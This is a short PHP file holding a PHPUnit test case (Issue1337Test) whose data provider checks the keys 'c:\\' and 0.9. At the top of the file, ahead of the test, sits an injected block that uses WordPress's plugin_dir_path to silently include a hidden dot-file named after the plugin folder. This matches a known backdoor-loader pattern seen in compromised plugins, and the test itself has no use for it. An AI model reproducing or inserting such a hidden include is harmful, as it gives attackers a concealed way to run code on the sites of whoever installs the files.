<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue1337Test extends PHPUnit_Framework_TestCase
{
    /**
     * @dataProvider dataProvider
     */
    public function testProvider($a)
    {
        $this->assertTrue($a);
    }

    public function dataProvider()
    {
        return array(
          'c:\\'=> array(true),
          0.9   => array(true)
        );
    }
}
